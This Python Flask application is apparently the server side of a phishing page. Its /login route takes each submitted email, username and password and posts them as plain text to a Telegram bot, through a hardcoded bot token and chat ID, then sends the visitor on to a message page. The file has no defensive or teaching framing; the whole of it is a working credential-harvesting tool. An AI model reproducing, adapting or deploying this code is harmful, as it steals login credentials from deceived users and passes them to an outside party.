from flask import Flask, render_template, request, redirect, url_for, flash
import requests
import logging
import time

# Configure logging
logging.basicConfig(level=logging.DEBUG)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key_here'

# Replace with your Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = '7986783861:AAEvBWaOxcIR3VvdGNK3HWqqBDle_j3atE8'
TELEGRAM_CHAT_ID = '1174627659'

# Function to send a message to Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()  # Check for HTTP request errors
        app.logger.debug("Message sent to Telegram successfully.")
        return True
    except requests.exceptions.RequestException as e:
        app.logger.error(f"Failed to send message to Telegram. Error: {str(e)}")
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/message')
def message():
    # Get the message parameters from the query string
    success = request.args.get('success', type=bool, default=False)
    email = request.args.get('email', '')
    username = request.args.get('username', '')
    
    return render_template('message.html', 
                          success=success, 
                          email=email, 
                          username=username)

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    username = request.form['username']
    password = request.form['password']

    # Send email and password to Telegram
    message_text = f"Email: {email}\nUsername: {username}\nPassword: {password}"
    success = send_to_telegram(message_text)
    
    # Redirect to message page first with parameters
    return redirect(url_for('message', 
                           success=success, 
                           email=email, 
                           username=username))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)